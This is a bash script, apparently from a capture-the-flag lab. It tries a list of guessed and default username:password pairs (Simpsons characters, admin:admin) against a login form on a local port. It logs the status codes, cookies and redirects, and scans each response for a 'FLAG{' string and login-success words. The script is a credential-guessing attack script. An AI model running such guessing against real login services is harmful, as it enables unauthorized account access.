# Test all credential combinations and save detailed responses
echo "=== Testing Simpsons Character Credentials ==="
echo ""

credentials=(
  "homer:homer"
  "bart:bart"
  "marge:marge"
  "lisa:lisa"
  "burns:burns"
  "admin:admin"
  "admin:password"
  "simpson:simpson"
  "springfield:springfield"
)

for cred in "${credentials[@]}"; do
  username="${cred%:*}"
  password="${cred#*:}"
  
  echo "=========================================="
  echo "Testing: $username:$password"
  echo "=========================================="
  
  # Send POST request with credentials
  response=$(curl -i -s -X POST "http://127.0.0.1:32907/index.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$username&password=$password" \
    --max-time 10)
  
  echo "$response"
  
  # Extract and display key metrics
  status=$(echo "$response" | grep -i "HTTP/" | head -1)
  content_length=$(echo "$response" | grep -i "Content-Length:" | head -1)
  set_cookie=$(echo "$response" | grep -i "Set-Cookie:" | head -1)
  location=$(echo "$response" | grep -i "Location:" | head -1)
  
  echo ""
  echo "--- Summary ---"
  echo "Status: $status"
  echo "Content-Length: $content_length"
  echo "Set-Cookie: $set_cookie"
  echo "Location: $location"
  
  # Check for FLAG in response
  flag_check=$(echo "$response" | grep -i "FLAG{" || echo "No FLAG found")
  echo "Flag Check: $flag_check"
  
  # Check for success indicators
  success_check=$(echo "$response" | grep -iE "(welcome|success|logged in|dashboard)" || echo "No success message")
  echo "Success Indicators: $success_check"
  
  # Get response body length
  body=$(echo "$response" | sed -n '/^\r$/,$p' | tail -n +2)
  body_length=$(echo "$body" | wc -c)
  echo "Body Length: $body_length bytes"
  
  echo ""
  sleep 0.5
done

